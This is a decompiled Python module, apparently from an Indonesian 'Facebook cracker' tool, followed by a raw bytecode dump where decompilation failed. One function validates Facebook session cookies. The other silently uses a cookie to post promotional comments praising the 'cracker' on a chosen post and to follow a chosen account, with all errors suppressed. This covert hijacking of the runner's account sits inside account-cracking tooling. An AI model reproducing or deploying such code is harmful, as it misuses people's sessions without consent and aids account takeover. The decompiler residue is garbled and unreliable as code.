# Filenames : 
# Python bytecode : 3.8
# Time succses decompiled Sat Sep 26 03:38:38 2020
# Selector <module> in line 1 file 
# Timestamp in code : 2020-06-27 04:07:18

#Instruction context error:
#   
# L.  58        66  POP_BLOCK        
#                  68  LOAD_CONST               False
#                  70  RETURN_VALUE     
#->                72  POP_BLOCK        
#                  74  JUMP_FORWARD        108  'to 108'
#                76_0  COME_FROM_FINALLY     0  '0'
import os, re, sys, random, requests
sys.path.append('..')
from lib.parsing import form
from bs4 import BeautifulSoup as parser
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
host = 'https://mbasic.facebook.com{}'

def settings(kuki, user, post):
    try:
        x = {}
        to = requests.get((host.format(post)), cookies=kuki)
        inp = form(to, 'comment.php')
        joe = re.findall('"><form action="(/a/comment.php\\?fs=.*?)".*?name="fb_dtsg".*?value="(.*?)".*?name="jazoest".*?value="(\\d*)"', str(to))[0]
        x['fb_dtsg'] = joe[1]
        x['jazoest'] = joe[2]
        kata = [
         "Hy, I'm Facebook cracker user",
         'Toolsnya mantap',
         'Buset bro, sumpah ini keren!!']
        x['comment_text'] = random.choice(kata)
        requests.post((host.format(joe[0].replace('&amp;', '&'))), data=x, cookies=kuki)
        try:
            requests.get((host.format(parser(requests.get((host.format(user)), cookies=kuki).content, 'html.parser').find('a',
              string='Ikuti')['href'])),
              cookies=kuki)
        except TypeError:
            pass

    except:
        pass

def val(kuki):
#     --- fixed ---
    try:
        kuki = {'cookie': kuki}
        ismi = requests.get((host.format('/profile.php')), headers=kuki).content
        if 'mbasic_logout_button' in str(ismi):
            return re.findall('title>(.*?)</title>', str(ismi))[0]
        return False
    except requests.exceptions.ConnectionError:
        exit('  { ! } Bad connection')

"""
def val--- This code section failed: ---

 L.  52         0  SETUP_FINALLY        76  'to 76'

 L.  53         2  LOAD_STR                 'cookie'
                4  LOAD_FAST                'kuki'
                6  BUILD_MAP_1           1 
                8  STORE_FAST               'kuki'

 L.  54        10  LOAD_GLOBAL              requests
               12  LOAD_ATTR                get
               14  LOAD_GLOBAL              host
               16  LOAD_METHOD              format
               18  LOAD_STR                 '/profile.php'
               20  CALL_METHOD_1         1  ''
               22  LOAD_FAST                'kuki'
               24  LOAD_CONST               ('headers',)
               26  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               28  LOAD_ATTR                content
               30  STORE_FAST               'ismi'

 L.  55        32  LOAD_STR                 'mbasic_logout_button'
               34  LOAD_GLOBAL              str
               36  LOAD_FAST                'ismi'
               38  CALL_FUNCTION_1       1  ''
               40  COMPARE_OP               in
               42  POP_JUMP_IF_FALSE    66  'to 66'

 L.  56        44  LOAD_GLOBAL              re
               46  LOAD_METHOD              findall
               48  LOAD_STR                 'title>(.*?)</title>'
               50  LOAD_GLOBAL              str
               52  LOAD_FAST                'ismi'
               54  CALL_FUNCTION_1       1  ''
               56  CALL_METHOD_2         2  ''
               58  LOAD_CONST               0
               60  BINARY_SUBSCR    
               62  POP_BLOCK        
               64  RETURN_VALUE     
             66_0  COME_FROM            42  '42'

 L.  58        66  POP_BLOCK        
               68  LOAD_CONST               False
               70  RETURN_VALUE     
               72  POP_BLOCK        
               74  JUMP_FORWARD        108  'to 108'
             76_0  COME_FROM_FINALLY     0  '0'

 L.  59        76  DUP_TOP          
               78  LOAD_GLOBAL              requests
               80  LOAD_ATTR                exceptions
               82  LOAD_ATTR                ConnectionError
               84  COMPARE_OP               exception-match
               86  POP_JUMP_IF_FALSE   106  'to 106'
               88  POP_TOP          
               90  POP_TOP          
               92  POP_TOP          

 L.  60        94  LOAD_GLOBAL              exit
               96  LOAD_STR                 '  { ! } Bad connection'
               98  CALL_FUNCTION_1       1  ''
              100  POP_TOP          
              102  POP_EXCEPT       
              104  JUMP_FORWARD        108  'to 108'
            106_0  COME_FROM            86  '86'
              106  END_FINALLY      
            108_0  COME_FROM           104  '104'
            108_1  COME_FROM            74  '74'

Parse error at or near `POP_BLOCK' instruction at offset 72
"""
